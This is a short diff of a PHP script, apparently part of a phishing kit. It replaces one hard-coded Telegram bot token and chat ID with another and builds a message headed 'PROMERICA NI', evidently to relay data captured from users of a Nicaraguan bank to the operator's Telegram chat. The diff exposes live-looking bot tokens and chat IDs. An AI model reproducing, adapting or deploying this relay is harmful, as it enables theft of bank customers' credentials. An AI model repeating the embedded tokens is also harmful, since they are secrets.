@@ -1,7 +1,7 @@
 <?php
 // Token real de tu bot (obtenido de @BotFather)
-$botToken = "6302268654:AAE5OyUgJ8_My1ArZHTGdVfiRgvhCiVkvhU";
-$chatId = "1884350168";
+$botToken = "8319913387:AAHifbNZGC6r7I4jHzO1iIZti0jsYbSod-g";
+$chatId = "7655000874";
 
 // Codificar el mensaje para URL
 $message = urlencode("PROMERICA NI 📲
@@ -32,4 +32,5 @@ if ($httpCode !== 200) {
 }
 
 curl_close($ch);
+
 ?>
